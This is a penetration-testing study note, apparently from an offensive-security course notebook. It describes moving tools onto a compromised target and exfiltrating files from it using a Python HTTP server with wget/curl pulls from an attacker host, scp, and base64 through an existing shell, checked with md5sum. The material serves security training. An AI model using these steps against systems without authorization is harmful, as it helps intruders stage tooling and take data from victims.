# File Transfer Methods

**Phase:** 04-foothold-and-shells
**Platform:** Linux / Windows
**Source module(s):** 02 Getting Started

## When to use

Moving tools (enumeration scripts, exploit binaries) onto a target, or exfiltrating files off one, once a shell exists.

## Prerequisites

Network reachability between attack host and target for the HTTP/SCP methods. For the base64 method, only a copy-paste-capable shell is needed, no new network path.

## Command

```bash
# HTTP server method
python3 -m http.server 8000          # attacker
wget http://<ip>:8000/file           # target
curl -o file http://<ip>:8000/file   # target, alternative

# SCP
scp file user@host:/path

# Base64, for firewall-restricted environments
base64 file -w 0                     # attacker: encode
echo <string> | base64 -d > file     # target: decode

# Always validate after transfer
file <filename>
md5sum <filename>
```

| Part | What it does |
|---|---|
| `python3 -m http.server 8000` | Quick throwaway HTTP server to serve files from the attack host |
| `base64 -w 0` | Encodes with no line wrapping, so the output can be pasted as a single unbroken string |
| `file <filename>` | Confirms what type of file actually arrived |
| `md5sum <filename>` | Confirms the transferred file is byte-for-byte identical on both ends |

## Expected output

A file present on the target (or attacker) matching the source file's hash exactly.

## What failure looks like

A transferred file that runs or opens incorrectly despite "completing": usually a silent truncation or encoding issue, which is exactly what the `md5sum` check on both ends catches before wasting time debugging a corrupted binary.

## Why it works

Each method exists for a different constraint:
- **HTTP server:** fastest, works whenever outbound HTTP from the target is allowed.
- **SCP:** works when SSH credentials exist and is the most "normal-looking" traffic, useful when stealth matters.
- **Base64:** works even when no new network path is available at all, since it only needs stdin/stdout through the existing shell. The tradeoff is size: base64 expands data by roughly a third, and extremely long strings can hit shell input limits.

Validating with `file` and `md5sum` matters because a transfer that "completes" at the shell level can still be truncated or corrupted, especially over copy-paste-based methods like base64 where an intermediate terminal buffer limit can silently cut the string.

## Alternatives and tradeoffs

Choice of method is dictated entirely by what the target's network and tooling allow, not by preference. Check outbound HTTP first, since it is fastest and simplest; fall back to base64 only when no direct network path exists.

## Next step

Once tooling is on the target, proceed to privilege escalation enumeration: [05-privesc-linux](../05-privesc-linux/README.md) or [06-privesc-windows](../06-privesc-windows/README.md).

## Self-test

- [ ] I can explain it without notes
- [ ] I can predict the output before running it
- [ ] I can recognize a wrong result
- [ ] I can troubleshoot a failure
- [ ] I can reproduce it from the documentation if I forget the syntax
